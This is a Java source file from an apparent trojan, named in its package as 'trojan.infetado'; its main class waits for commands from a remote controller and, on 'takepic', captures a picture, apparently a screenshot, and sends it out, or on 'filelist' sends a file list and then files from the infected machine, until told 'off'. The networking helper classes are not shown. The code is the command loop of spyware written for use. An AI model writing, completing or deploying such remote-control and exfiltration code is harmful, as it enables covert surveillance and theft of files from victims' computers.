package trojan.infetado;

import java.awt.AWTException;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;
import network.*;

public class Main {
    
    PrintWriter outt;
    BufferedReader inn;
    InputStream in = null;
    OutputStream out = null;
    Socket socket = null;

    public static void main(String[] args) throws AWTException, IOException {

        final String pic = "takepic";
        final String off = "off";
        final String file = "filelist";

        RecieveCom cc = new RecieveCom();

        String msg = "on";
        do {

            msg = cc.com;

            if (msg.equals(pic)) {
                TakePicture aut = new TakePicture();
                aut.takePicture();
                SendPic s = new SendPic();
            } else if (msg.equals(file)) {
                SendArray sa = new SendArray();
                RecieveNum rn = new RecieveNum();
                SendNome sn = new SendNome();
                SendFile sf = new SendFile();
            }

        } while (!msg.equals(off));

    }

}
